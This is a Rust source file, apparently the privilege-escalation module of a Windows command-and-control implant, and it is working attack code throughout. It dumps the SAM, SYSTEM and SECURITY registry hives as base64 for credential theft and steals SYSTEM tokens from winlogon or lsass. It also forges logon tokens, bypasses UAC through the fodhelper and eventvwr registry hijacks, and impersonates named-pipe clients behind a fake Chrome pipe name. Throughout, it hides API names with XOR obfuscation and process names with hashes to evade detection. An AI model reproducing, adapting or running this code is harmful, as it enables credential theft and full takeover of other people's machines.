//! Privilege escalation — Phase 4.
//! Task type: "priv", args: {"method": "<name>", ...}

use crate::task::{Task, TaskOutput};

pub fn exec_priv(task: &Task) -> TaskOutput {
    #[cfg(target_os = "windows")]
    return exec_priv_win(task);
    #[cfg(not(target_os = "windows"))]
    TaskOutput::failure("priv: Windows only")
}

#[cfg(target_os = "windows")]
fn exec_priv_win(task: &Task) -> TaskOutput {
    let args = match task.args.as_deref() {
        Some(a) => a,
        None    => return TaskOutput::failure("priv: no args"),
    };
    let v: serde_json::Value = match serde_json::from_slice(args) {
        Ok(v)  => v,
        Err(e) => return TaskOutput::failure(&format!("priv: {e}")),
    };
    match v.get("method").and_then(|m| m.as_str()).unwrap_or("") {
        "sam-dump"       => sam_dump(),
        "token-steal"    => token_steal(&v),
        "token-make"     => token_make(&v),
        "uac-fodhelper"  => uac_fodhelper(&v),
        "uac-eventvwr"   => uac_eventvwr(&v),
        "pipe-impersonate" => pipe_impersonate(),
        other => TaskOutput::failure(&format!("priv: unknown method: {other}")),
    }
}

// ── Advapi32 dynamic loader ───────────────────────────────────────────────────

#[cfg(target_os = "windows")]
fn adv_base() -> usize {
    // "advapi32.dll\0" XOR 0x5A
    crate::loader::get_module_base(
        crate::obfs::dec(&[0x3B,0x3E,0x2C,0x3B,0x2A,0x33,0x69,0x68,0x74,0x3E,0x36,0x36,0x5A]).as_ptr()
    )
}

#[cfg(target_os = "windows")]
unsafe fn adv_fn(base: usize, enc: &[u8]) -> Option<*const u8> {
    let name = crate::obfs::dec(enc);
    crate::loader::get_export_by_name(base, name.as_ptr())
}

#[cfg(target_os = "windows")]
fn shell_execute_w(op: *const u16, file: *const u16) -> usize {
    // "shell32.dll\0" XOR 0x5A
    let shell32 = crate::loader::get_module_base(
        crate::obfs::dec(&[0x29,0x32,0x3F,0x36,0x36,0x69,0x68,0x74,0x3E,0x36,0x36,0x5A]).as_ptr()
    );
    if shell32 == 0 { return 0; }
    // "ShellExecuteW\0" XOR 0x5A
    let fn_ptr = unsafe { crate::loader::get_export_by_name(shell32,
        crate::obfs::dec(&[0x09,0x32,0x3F,0x36,0x36,0x1F,0x22,0x3F,0x39,0x2F,0x2E,0x3F,0x0D,0x5A]).as_ptr())
    };
    let fn_ptr = match fn_ptr { Some(p) => p, None => return 0 };
    type ShellExecuteWFn = unsafe extern "system" fn(isize, *const u16, *const u16, *const u16, *const u16, i32) -> isize;
    let f: ShellExecuteWFn = unsafe { core::mem::transmute(fn_ptr) };
    unsafe { f(0, op, file, core::ptr::null(), core::ptr::null(), 1) as usize }
}

#[cfg(target_os = "windows")]
fn k32_base() -> usize {
    // "kernel32.dll\0" XOR 0x5A
    crate::loader::get_module_base(
        crate::obfs::dec(&[0x31,0x3F,0x28,0x34,0x3F,0x36,0x69,0x68,0x74,0x3E,0x36,0x36,0x5A]).as_ptr()
    )
}

// ── SAM/SYSTEM/SECURITY hive dump ─────────────────────────────────────────────
//
// 1. Enable SeBackupPrivilege (idx 17) via RtlAdjustPrivilege
// 2. RegOpenKeyExA HKLM\SAM, \SYSTEM, \SECURITY with REG_OPTION_BACKUP_RESTORE
// 3. RegSaveKeyExA to temp files
// 4. Read + base64-encode each hive → return JSON
// 5. Delete temp files

#[cfg(target_os = "windows")]
fn sam_dump() -> TaskOutput {
    use windows_sys::Win32::Foundation::CloseHandle;

    enable_backup_privilege();

    const HKLM: isize = -2147483646isize;
    const KEY_READ: u32 = 0x20019;
    const REG_OPTION_BACKUP_RESTORE: u32 = 0x0004;

    let adv = adv_base();
    if adv == 0 { return TaskOutput::failure("sam: advapi32 not found"); }

    type RegOpenKeyExAFn = unsafe extern "system" fn(isize, *const u8, u32, u32, *mut isize) -> i32;
    type RegSaveKeyExAFn = unsafe extern "system" fn(isize, *const u8, *const u8, u32) -> i32;
    type RegCloseKeyFn   = unsafe extern "system" fn(isize) -> i32;

    let fn_open  = unsafe { adv_fn(adv, &[0x08,0x3F,0x3D,0x15,0x2A,0x3F,0x34,0x11,0x3F,0x23,0x1F,0x22,0x1B,0x5A]) };
    let fn_save  = unsafe { adv_fn(adv, &[0x08,0x3F,0x3D,0x09,0x3B,0x2C,0x3F,0x11,0x3F,0x23,0x1F,0x22,0x1B,0x5A]) };
    let fn_close = unsafe { adv_fn(adv, &[0x08,0x3F,0x3D,0x19,0x36,0x35,0x29,0x3F,0x11,0x3F,0x23,0x5A]) };

    let (fn_open, fn_save, fn_close) = match (fn_open, fn_save, fn_close) {
        (Some(a), Some(b), Some(c)) => (
            unsafe { core::mem::transmute::<_, RegOpenKeyExAFn>(a) },
            unsafe { core::mem::transmute::<_, RegSaveKeyExAFn>(b) },
            unsafe { core::mem::transmute::<_, RegCloseKeyFn>(c) },
        ),
        _ => return TaskOutput::failure("sam: failed to resolve reg functions"),
    };

    let hives = [
        (b"SAM\0".as_ptr(),      b"C:\\Windows\\Temp\\~s1.tmp\0".as_ptr()),
        (b"SYSTEM\0".as_ptr(),   b"C:\\Windows\\Temp\\~s2.tmp\0".as_ptr()),
        (b"SECURITY\0".as_ptr(), b"C:\\Windows\\Temp\\~s3.tmp\0".as_ptr()),
    ];

    let mut results: Vec<(&str, Vec<u8>)> = Vec::new();
    for (sub, tmp_path) in &hives {
        let mut hkey: isize = 0;
        let r = unsafe { fn_open(HKLM, *sub, REG_OPTION_BACKUP_RESTORE, KEY_READ, &mut hkey) };
        if r != 0 || hkey == 0 { continue; }
        unsafe { fn_save(hkey, *tmp_path, core::ptr::null(), 1 /* REG_LATEST_FORMAT */) };
        unsafe { fn_close(hkey) };
        let path_str = unsafe {
            let mut len = 0;
            while *tmp_path.add(len) != b'\0' { len += 1; }
            core::str::from_utf8_unchecked(core::slice::from_raw_parts(*tmp_path, len))
        };
        if let Ok(data) = std::fs::read(path_str) {
            let _ = std::fs::remove_file(path_str);
            let name = unsafe {
                let mut len = 0;
                while *sub.add(len) != b'\0' { len += 1; }
                core::str::from_utf8_unchecked(core::slice::from_raw_parts(*sub, len))
            };
            results.push((name, data));
        }
    }

    if results.is_empty() {
        return TaskOutput::failure("sam: no hives saved (need SeBackupPrivilege / admin)");
    }

    use base64::Engine;
    let mut out = String::from("{");
    for (i, (name, data)) in results.iter().enumerate() {
        if i > 0 { out.push(','); }
        let b64 = base64::engine::general_purpose::STANDARD.encode(data);
        out.push_str(&format!("\"{}\":\"{}\"", name, b64));
    }
    out.push('}');
    TaskOutput::success(out.into_bytes())
}

#[cfg(target_os = "windows")]
fn enable_backup_privilege() {
    let ntdll = crate::loader::get_module_base(
        crate::obfs::dec(&[0x34,0x2E,0x3E,0x36,0x36,0x74,0x3E,0x36,0x36,0x5A]).as_ptr()
    );
    if ntdll == 0 { return; }
    // "RtlAdjustPrivilege\0" XOR 0x5A
    let fn_ptr = unsafe { crate::loader::get_export_by_name(ntdll,
        crate::obfs::dec(&[0x43,0x65,0x7D,0x50,0x75,0x7B,0x64,0x62,0x65,0x41,0x63,0x78,0x67,0x78,0x7D,0x74,0x76,0x74,0x11]).as_ptr()
    )};
    if let Some(p) = fn_ptr {
        type Fn = unsafe extern "system" fn(u32, u32, u32, *mut u32) -> i32;
        let f: Fn = unsafe { core::mem::transmute(p) };
        let mut prev: u32 = 0;
        unsafe { f(17, 1, 0, &mut prev) }; // SeBackupPrivilege = 17
    }
}

// ── Token steal ───────────────────────────────────────────────────────────────
//
// Finds winlogon.exe (SYSTEM), opens its token, duplicates to a primary token,
// then either impersonates in-place or spawns a child process as SYSTEM.
// args: {"method":"token-steal", "spawn":"<optional cmd>"}

#[cfg(target_os = "windows")]
fn token_steal(v: &serde_json::Value) -> TaskOutput {
    use windows_sys::Win32::Foundation::CloseHandle;
    use windows_sys::Win32::System::Threading::{OpenProcess, PROCESS_QUERY_INFORMATION};

    let spawn_cmd = v.get("spawn").and_then(|s| s.as_str()).map(String::from);

    // Find a SYSTEM process — prefer winlogon.exe, fall back to lsass/services
    // DJB2 hashes so no plaintext
    const fn djb2(s: &[u8]) -> u32 { crate::obfs::djb2(s) }
    const TARGETS: &[u32] = &[
        djb2(b"winlogon.exe"),
        djb2(b"lsass.exe"),
        djb2(b"services.exe"),
    ];

    let pid = find_pid_by_hash(TARGETS)
        .ok_or("token-steal: no suitable SYSTEM process found")
        .map_err(|e| TaskOutput::failure(e));
    let pid = match pid { Ok(p) => p, Err(e) => return e };

    let proc = unsafe { OpenProcess(PROCESS_QUERY_INFORMATION, 0, pid) };
    if proc == 0 { return TaskOutput::failure("token-steal: OpenProcess failed"); }

    let adv = adv_base();
    if adv == 0 { unsafe { CloseHandle(proc) }; return TaskOutput::failure("token-steal: advapi32 not found"); }

    type OpenProcessTokenFn      = unsafe extern "system" fn(isize, u32, *mut isize) -> i32;
    type DuplicateTokenExFn      = unsafe extern "system" fn(isize, u32, *mut u8, u32, u32, *mut isize) -> i32;
    type ImpersonateFn           = unsafe extern "system" fn(isize) -> i32;
    type CreateProcWithTokenWFn  = unsafe extern "system" fn(isize, u32, *const u16, *mut u16, u32, *mut u8, *const u16, *mut u8, *mut u8) -> i32;
    type GetUserNameWFn          = unsafe extern "system" fn(*mut u16, *mut u32) -> i32;

    let p_open    = unsafe { adv_fn(adv, &[0x15,0x2A,0x3F,0x34,0x0A,0x28,0x35,0x39,0x3F,0x29,0x29,0x0E,0x35,0x31,0x3F,0x34,0x5A]) };
    let p_dup     = unsafe { adv_fn(adv, &[0x1E,0x2F,0x2A,0x36,0x33,0x39,0x3B,0x2E,0x3F,0x0E,0x35,0x31,0x3F,0x34,0x1F,0x22,0x5A]) };
    let p_imp     = unsafe { adv_fn(adv, &[0x13,0x37,0x2A,0x3F,0x28,0x29,0x35,0x34,0x3B,0x2E,0x3F,0x16,0x35,0x3D,0x3D,0x3F,0x3E,0x15,0x34,0x0F,0x29,0x3F,0x28,0x5A]) };
    let p_cpwt    = unsafe { adv_fn(adv, &[0x19,0x28,0x3F,0x3B,0x2E,0x3F,0x0A,0x28,0x35,0x39,0x3F,0x29,0x29,0x0D,0x33,0x2E,0x32,0x0E,0x35,0x31,0x3F,0x34,0x0D,0x5A]) };
    let p_getuser = unsafe { adv_fn(adv, &[0x1D,0x3F,0x2E,0x0F,0x29,0x3F,0x28,0x14,0x3B,0x37,0x3F,0x0D,0x5A]) };

    let (fn_open, fn_dup, fn_imp, fn_getuser) = match (p_open, p_dup, p_imp, p_getuser) {
        (Some(a), Some(b), Some(c), Some(e)) => (
            unsafe { core::mem::transmute::<_, OpenProcessTokenFn>(a) },
            unsafe { core::mem::transmute::<_, DuplicateTokenExFn>(b) },
            unsafe { core::mem::transmute::<_, ImpersonateFn>(c) },
            unsafe { core::mem::transmute::<_, GetUserNameWFn>(e) },
        ),
        _ => { unsafe { CloseHandle(proc) }; return TaskOutput::failure("token-steal: fn resolve failed"); }
    };

    const TOKEN_DUPLICATE:     u32 = 0x0002;
    const TOKEN_QUERY:         u32 = 0x0008;
    const TOKEN_ALL_ACCESS:    u32 = 0xF01FF;
    const SECURITY_IMPERSONATION: u32 = 2;
    const TOKEN_PRIMARY:       u32 = 1;

    let mut token: isize = 0;
    if unsafe { fn_open(proc as isize, TOKEN_DUPLICATE | TOKEN_QUERY, &mut token) } == 0 {
        unsafe { CloseHandle(proc) };
        return TaskOutput::failure("token-steal: OpenProcessToken failed");
    }
    unsafe { CloseHandle(proc) };

    let mut dup_token: isize = 0;
    if unsafe { fn_dup(token, TOKEN_ALL_ACCESS, core::ptr::null_mut(), SECURITY_IMPERSONATION, TOKEN_PRIMARY, &mut dup_token) } == 0 {
        unsafe { CloseHandle(token) };
        return TaskOutput::failure("token-steal: DuplicateTokenEx failed");
    }
    unsafe { CloseHandle(token) };

    if let Some(cmd) = spawn_cmd {
        // Spawn process as the stolen identity
        if let Some(cpwt_ptr) = p_cpwt {
            let fn_cpwt: CreateProcWithTokenWFn = unsafe { core::mem::transmute(cpwt_ptr) };
            let mut cmdline: Vec<u16> = cmd.encode_utf16().chain(core::iter::once(0)).collect();
            use windows_sys::Win32::System::Threading::{PROCESS_INFORMATION, STARTUPINFOW};
            let mut si: STARTUPINFOW = unsafe { core::mem::zeroed() };
            si.cb = core::mem::size_of::<STARTUPINFOW>() as u32;
            let mut pi: PROCESS_INFORMATION = unsafe { core::mem::zeroed() };
            const CREATE_NO_WINDOW: u32 = 0x08000000;
            let ok = unsafe { fn_cpwt(
                dup_token, 0,
                core::ptr::null(), cmdline.as_mut_ptr(),
                CREATE_NO_WINDOW,
                core::ptr::null_mut(), core::ptr::null(),
                &mut si as *mut _ as *mut u8,
                &mut pi as *mut _ as *mut u8,
            ) };
            unsafe { CloseHandle(dup_token) };
            if ok == 0 {
                return TaskOutput::failure("token-steal: CreateProcessWithTokenW failed");
            }
            unsafe { CloseHandle(pi.hProcess); CloseHandle(pi.hThread) };
            return TaskOutput::success(format!("spawned as SYSTEM (pid {})", pi.dwProcessId).into_bytes());
        }
    }

    // Impersonate in the current thread
    unsafe { fn_imp(dup_token) };
    unsafe { CloseHandle(dup_token) };

    let mut name = [0u16; 256];
    let mut len = 256u32;
    let ok = unsafe { fn_getuser(name.as_mut_ptr(), &mut len) };
    if ok != 0 && len > 1 {
        let who = String::from_utf16_lossy(&name[..len as usize - 1]);
        TaskOutput::success(format!("impersonating: {who}").into_bytes())
    } else {
        TaskOutput::success(b"token stolen; impersonating (GetUserNameW failed)".to_vec())
    }
}

#[cfg(target_os = "windows")]
fn find_pid_by_hash(hashes: &[u32]) -> Option<u32> {
    use windows_sys::Win32::Foundation::{CloseHandle, INVALID_HANDLE_VALUE};
    use windows_sys::Win32::System::Diagnostics::ToolHelp::{
        CreateToolhelp32Snapshot, Process32FirstW, Process32NextW,
        PROCESSENTRY32W, TH32CS_SNAPPROCESS,
    };
    unsafe {
        let snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if snap == INVALID_HANDLE_VALUE { return None; }
        let mut e: PROCESSENTRY32W = core::mem::zeroed();
        e.dwSize = core::mem::size_of::<PROCESSENTRY32W>() as u32;
        if Process32FirstW(snap, &mut e) != 0 {
            loop {
                let nlen = e.szExeFile.iter().position(|&c| c == 0).unwrap_or(260);
                let name: Vec<u8> = String::from_utf16_lossy(&e.szExeFile[..nlen])
                    .to_ascii_lowercase().into_bytes();
                let h = crate::obfs::djb2(&name);
                if hashes.contains(&h) {
                    let pid = e.th32ProcessID;
                    CloseHandle(snap);
                    return Some(pid);
                }
                e = core::mem::zeroed();
                e.dwSize = core::mem::size_of::<PROCESSENTRY32W>() as u32;
                if Process32NextW(snap, &mut e) == 0 { break; }
            }
        }
        CloseHandle(snap);
        None
    }
}

// ── Token make (LogonUser) ────────────────────────────────────────────────────

#[cfg(target_os = "windows")]
fn token_make(v: &serde_json::Value) -> TaskOutput {
    use windows_sys::Win32::Foundation::CloseHandle;

    let user   = match v.get("user").and_then(|s| s.as_str()) { Some(s) => s, None => return TaskOutput::failure("token-make: missing user") };
    let pass   = match v.get("pass").and_then(|s| s.as_str()) { Some(s) => s, None => return TaskOutput::failure("token-make: missing pass") };
    let domain = v.get("domain").and_then(|s| s.as_str()).unwrap_or(".");

    let adv = adv_base();
    if adv == 0 { return TaskOutput::failure("token-make: advapi32 not found"); }

    type LogonUserWFn   = unsafe extern "system" fn(*const u16, *const u16, *const u16, u32, u32, *mut isize) -> i32;
    type ImpersonateFn  = unsafe extern "system" fn(isize) -> i32;

    let p_logon = unsafe { adv_fn(adv, &[0x16,0x35,0x3D,0x35,0x34,0x0F,0x29,0x3F,0x28,0x0D,0x5A]) };
    let p_imp   = unsafe { adv_fn(adv, &[0x13,0x37,0x2A,0x3F,0x28,0x29,0x35,0x34,0x3B,0x2E,0x3F,0x16,0x35,0x3D,0x3D,0x3F,0x3E,0x15,0x34,0x0F,0x29,0x3F,0x28,0x5A]) };

    let (fn_logon, fn_imp) = match (p_logon, p_imp) {
        (Some(a), Some(b)) => (
            unsafe { core::mem::transmute::<_, LogonUserWFn>(a) },
            unsafe { core::mem::transmute::<_, ImpersonateFn>(b) },
        ),
        _ => return TaskOutput::failure("token-make: fn resolve failed"),
    };

    let user_w:   Vec<u16> = user.encode_utf16().chain(core::iter::once(0)).collect();
    let pass_w:   Vec<u16> = pass.encode_utf16().chain(core::iter::once(0)).collect();
    let domain_w: Vec<u16> = domain.encode_utf16().chain(core::iter::once(0)).collect();

    const LOGON32_LOGON_NETWORK: u32  = 3;
    const LOGON32_PROVIDER_DEFAULT: u32 = 0;

    let mut token: isize = 0;
    let ok = unsafe { fn_logon(user_w.as_ptr(), domain_w.as_ptr(), pass_w.as_ptr(),
        LOGON32_LOGON_NETWORK, LOGON32_PROVIDER_DEFAULT, &mut token) };
    if ok == 0 || token == 0 {
        return TaskOutput::failure(&format!("token-make: LogonUserW failed for {domain}\\{user}"));
    }

    unsafe { fn_imp(token) };
    unsafe { CloseHandle(token) };
    TaskOutput::success(format!("token created and impersonating: {domain}\\{user}").into_bytes())
}

// ── UAC bypass — fodhelper ────────────────────────────────────────────────────
//
// Writes cmd to HKCU\Software\Classes\ms-settings\Shell\Open\command,
// sets DelegateExecute="", then launches fodhelper.exe which reads the
// HKCU class association and runs our command elevated.

#[cfg(target_os = "windows")]
fn uac_fodhelper(v: &serde_json::Value) -> TaskOutput {
    let cmd = match v.get("cmd").and_then(|s| s.as_str()) {
        Some(c) => c.to_string(),
        None    => return TaskOutput::failure("uac-fodhelper: missing cmd"),
    };

    if let Err(e) = reg_write_uac_key(&cmd) {
        return TaskOutput::failure(&format!("uac-fodhelper: reg write failed: {e}"));
    }

    // Launch fodhelper.exe — no UAC prompt since it's auto-elevated
    let op:   Vec<u16> = "open\0".encode_utf16().collect();
    let file: Vec<u16> = "fodhelper.exe\0".encode_utf16().collect();
    let ret = shell_execute_w(op.as_ptr(), file.as_ptr());

    // Wait briefly then clean up registry
    std::thread::sleep(std::time::Duration::from_millis(2500));
    reg_delete_uac_key();

    if ret as usize > 32 {
        TaskOutput::success(b"uac-fodhelper: payload launched".to_vec())
    } else {
        TaskOutput::failure("uac-fodhelper: ShellExecuteW failed")
    }
}

#[cfg(target_os = "windows")]
fn uac_eventvwr(v: &serde_json::Value) -> TaskOutput {
    let cmd = match v.get("cmd").and_then(|s| s.as_str()) {
        Some(c) => c.to_string(),
        None    => return TaskOutput::failure("uac-eventvwr: missing cmd"),
    };

    // eventvwr reads HKCU\Software\Classes\mscfile\shell\open\command
    if let Err(e) = reg_write_mscfile_key(&cmd) {
        return TaskOutput::failure(&format!("uac-eventvwr: {e}"));
    }

    std::thread::sleep(std::time::Duration::from_millis(2500));
    reg_delete_mscfile_key();

    let op:   Vec<u16> = "open\0".encode_utf16().collect();
    let file: Vec<u16> = "eventvwr.exe\0".encode_utf16().collect();
    let ret = shell_execute_w(op.as_ptr(), file.as_ptr());

    if ret > 32 {
        TaskOutput::success(b"uac-eventvwr: payload launched".to_vec())
    } else {
        TaskOutput::failure("uac-eventvwr: ShellExecuteW failed")
    }
}

#[cfg(target_os = "windows")]
fn reg_write_uac_key(cmd: &str) -> Result<(), String> {
    reg_set_key_value(
        "Software\\Classes\\ms-settings\\Shell\\Open\\command",
        "",
        cmd,
    )?;
    reg_set_key_value(
        "Software\\Classes\\ms-settings\\Shell\\Open\\command",
        "DelegateExecute",
        "",
    )
}

#[cfg(target_os = "windows")]
fn reg_delete_uac_key() {
    reg_delete_key("Software\\Classes\\ms-settings\\Shell\\Open\\command");
    reg_delete_key("Software\\Classes\\ms-settings\\Shell\\Open");
    reg_delete_key("Software\\Classes\\ms-settings\\Shell");
    reg_delete_key("Software\\Classes\\ms-settings");
}

#[cfg(target_os = "windows")]
fn reg_write_mscfile_key(cmd: &str) -> Result<(), String> {
    reg_set_key_value("Software\\Classes\\mscfile\\shell\\open\\command", "", cmd)
}

#[cfg(target_os = "windows")]
fn reg_delete_mscfile_key() {
    reg_delete_key("Software\\Classes\\mscfile\\shell\\open\\command");
    reg_delete_key("Software\\Classes\\mscfile\\shell\\open");
    reg_delete_key("Software\\Classes\\mscfile\\shell");
    reg_delete_key("Software\\Classes\\mscfile");
}

// ── Registry helpers (HKCU, dynamic advapi32 calls) ──────────────────────────

#[cfg(target_os = "windows")]
fn reg_set_key_value(subkey: &str, value_name: &str, data: &str) -> Result<(), String> {
    const HKCU: isize = -2147483647isize;
    const KEY_WRITE: u32 = 0x20006;
    const REG_SZ: u32 = 1;

    type RegCreateKeyExAFn = unsafe extern "system" fn(isize, *const u8, u32, *const u8, u32, u32, *const u8, *mut isize, *mut u32) -> i32;
    type RegSetValueExAFn  = unsafe extern "system" fn(isize, *const u8, u32, u32, *const u8, u32) -> i32;
    type RegCloseKeyFn     = unsafe extern "system" fn(isize) -> i32;

    let adv = adv_base();
    if adv == 0 { return Err("advapi32 not found".into()); }

    let p_create = unsafe { adv_fn(adv, &[0x08,0x3F,0x3D,0x19,0x28,0x3F,0x3B,0x2E,0x3F,0x11,0x3F,0x23,0x1F,0x22,0x1B,0x5A]) };
    let p_set    = unsafe { adv_fn(adv, &[0x08,0x3F,0x3D,0x09,0x3F,0x2E,0x0C,0x3B,0x36,0x2F,0x3F,0x1F,0x22,0x1B,0x5A]) };
    let p_close  = unsafe { adv_fn(adv, &[0x08,0x3F,0x3D,0x19,0x36,0x35,0x29,0x3F,0x11,0x3F,0x23,0x5A]) };

    let (fn_create, fn_set, fn_close) = match (p_create, p_set, p_close) {
        (Some(a), Some(b), Some(c)) => (
            unsafe { core::mem::transmute::<_, RegCreateKeyExAFn>(a) },
            unsafe { core::mem::transmute::<_, RegSetValueExAFn>(b) },
            unsafe { core::mem::transmute::<_, RegCloseKeyFn>(c) },
        ),
        _ => return Err("fn resolve failed".into()),
    };

    let sub = std::ffi::CString::new(subkey).map_err(|e| e.to_string())?;
    let mut hkey: isize = 0;
    let mut disp: u32 = 0;
    let r = unsafe { fn_create(HKCU, sub.as_ptr() as *const u8, 0, core::ptr::null(), 0, KEY_WRITE, core::ptr::null(), &mut hkey, &mut disp) };
    if r != 0 { return Err(format!("RegCreateKeyEx failed: {r}")); }

    let vname = std::ffi::CString::new(value_name).map_err(|e| e.to_string())?;
    let data_c = std::ffi::CString::new(data).map_err(|e| e.to_string())?;
    let data_bytes = data_c.as_bytes_with_nul();
    unsafe { fn_set(hkey, vname.as_ptr() as *const u8, 0, REG_SZ, data_bytes.as_ptr(), data_bytes.len() as u32) };
    unsafe { fn_close(hkey) };
    Ok(())
}

#[cfg(target_os = "windows")]
fn reg_delete_key(subkey: &str) {
    const HKCU: isize = -2147483647isize;
    type RegDeleteKeyAFn = unsafe extern "system" fn(isize, *const u8) -> i32;
    let adv = adv_base();
    if adv == 0 { return; }
    let p = unsafe { adv_fn(adv, &[0x08,0x3F,0x3D,0x1E,0x3F,0x36,0x3F,0x2E,0x3F,0x11,0x3F,0x23,0x1B,0x5A]) };
    if let Some(p) = p {
        let f: RegDeleteKeyAFn = unsafe { core::mem::transmute(p) };
        let s = match std::ffi::CString::new(subkey) { Ok(s) => s, Err(_) => return };
        unsafe { f(HKCU, s.as_ptr() as *const u8) };
    }
}

// ── Named pipe impersonation ──────────────────────────────────────────────────
//
// Creates an overlapped pipe and waits 15s for a privileged process to connect,
// then calls ImpersonateNamedPipeClient.
// GetOverlappedResult(bWait=TRUE) is called after CancelIoEx to drain the
// cancelled I/O before closing handles — without this the pipe handle close
// can race with the kernel completion and hang indefinitely.

#[cfg(target_os = "windows")]
fn pipe_impersonate() -> TaskOutput {
    use windows_sys::Win32::Foundation::{CloseHandle, INVALID_HANDLE_VALUE};
    use windows_sys::Win32::System::IO::{CancelIoEx, GetOverlappedResult, OVERLAPPED};
    use windows_sys::Win32::System::Pipes::{
        ConnectNamedPipe, CreateNamedPipeA, DisconnectNamedPipe,
        PIPE_READMODE_BYTE, PIPE_TYPE_BYTE, PIPE_WAIT,
    };
    use windows_sys::Win32::System::Threading::{CreateEventA, WaitForSingleObject};
    const PIPE_ACCESS_DUPLEX:   u32 = 3;
    const FILE_FLAG_OVERLAPPED: u32 = 0x4000_0000;
    const WAIT_OBJECT_0:        u32 = 0;
    const NMPWAIT_USE_DEFAULT:  u32 = 0;

    let pipe_name = format!("\\\\.\\pipe\\mojo.{}.google.chrome.{:08X}",
        std::process::id(), rand_u32());
    let cname = match std::ffi::CString::new(pipe_name.as_str()) {
        Ok(c) => c, Err(_) => return TaskOutput::failure("pipe: name error"),
    };

    let event = unsafe { CreateEventA(core::ptr::null(), 1, 0, core::ptr::null()) };
    if event == 0 { return TaskOutput::failure("pipe: CreateEvent failed"); }

    let pipe = unsafe {
        CreateNamedPipeA(
            cname.as_ptr() as *const u8,
            PIPE_ACCESS_DUPLEX | FILE_FLAG_OVERLAPPED,
            PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT,
            1, 4096, 4096, NMPWAIT_USE_DEFAULT, core::ptr::null(),
        )
    };
    if pipe == INVALID_HANDLE_VALUE {
        unsafe { CloseHandle(event) };
        return TaskOutput::failure("pipe: CreateNamedPipe failed");
    }

    let mut ov: OVERLAPPED = unsafe { core::mem::zeroed() };
    ov.hEvent = event;
    unsafe { ConnectNamedPipe(pipe, &mut ov) };

    let adv = adv_base();
    if adv == 0 {
        unsafe { CancelIoEx(pipe, &ov) };
        let mut n = 0u32;
        unsafe { GetOverlappedResult(pipe, &ov, &mut n, 1) };
        unsafe { CloseHandle(pipe); CloseHandle(event) };
        return TaskOutput::failure("pipe: advapi32 not found");
    }

    type ImpersonatePipeFn = unsafe extern "system" fn(isize) -> i32;
    type RevertFn          = unsafe extern "system" fn() -> i32;
    type GetUserFn         = unsafe extern "system" fn(*mut u16, *mut u32) -> i32;

    let p_imp  = unsafe { adv_fn(adv, &[0x13,0x37,0x2A,0x3F,0x28,0x29,0x35,0x34,0x3B,0x2E,0x3F,0x14,0x3B,0x37,0x3F,0x3E,0x0A,0x33,0x2A,0x3F,0x19,0x36,0x33,0x3F,0x34,0x2E,0x5A]) };
    let p_rev  = unsafe { adv_fn(adv, &[0x08,0x3F,0x2C,0x3F,0x28,0x2E,0x0E,0x35,0x09,0x3F,0x36,0x3C,0x5A]) };
    let p_user = unsafe { adv_fn(adv, &[0x1D,0x3F,0x2E,0x0F,0x29,0x3F,0x28,0x14,0x3B,0x37,0x3F,0x0D,0x5A]) };

    let (fn_imp, fn_rev, fn_user) = match (p_imp, p_rev, p_user) {
        (Some(a), Some(b), Some(c)) => (
            unsafe { core::mem::transmute::<_, ImpersonatePipeFn>(a) },
            unsafe { core::mem::transmute::<_, RevertFn>(b) },
            unsafe { core::mem::transmute::<_, GetUserFn>(c) },
        ),
        _ => {
            unsafe { CancelIoEx(pipe, &ov) };
            let mut n = 0u32;
            unsafe { GetOverlappedResult(pipe, &ov, &mut n, 1) };
            unsafe { CloseHandle(pipe); CloseHandle(event) };
            return TaskOutput::failure("pipe: fn resolve failed");
        }
    };

    // Wait up to 15 seconds for a privileged process to connect
    let wait = unsafe { WaitForSingleObject(event, 15_000) };
    if wait != WAIT_OBJECT_0 {
        // Timeout or error — cancel the pending I/O and drain it before closing
        unsafe { CancelIoEx(pipe, &ov) };
        let mut n = 0u32;
        unsafe { GetOverlappedResult(pipe, &ov, &mut n, 1) }; // bWait=TRUE
        unsafe { CloseHandle(pipe); CloseHandle(event) };
        return TaskOutput::failure(&format!(
            "pipe: 15s timeout — no client connected to {}", pipe_name
        ));
    }
    unsafe { CloseHandle(event) };

    let imp_ok = unsafe { fn_imp(pipe) };
    if imp_ok == 0 {
        unsafe { DisconnectNamedPipe(pipe); CloseHandle(pipe) };
        return TaskOutput::failure("pipe: ImpersonateNamedPipeClient failed");
    }

    let mut uname = [0u16; 256];
    let mut ulen = 256u32;
    let _ = unsafe { fn_user(uname.as_mut_ptr(), &mut ulen) };
    let who = if ulen > 1 { String::from_utf16_lossy(&uname[..ulen as usize - 1]) } else { "unknown".into() };

    unsafe { fn_rev() };
    unsafe { DisconnectNamedPipe(pipe); CloseHandle(pipe) };

    TaskOutput::success(format!("pipe: impersonated {who} via {}", pipe_name).into_bytes())
}

#[cfg(target_os = "windows")]
fn rand_u32() -> u32 {
    use windows_sys::Win32::System::SystemInformation::GetTickCount64;
    unsafe { GetTickCount64() as u32 ^ (std::process::id() << 8) }
}
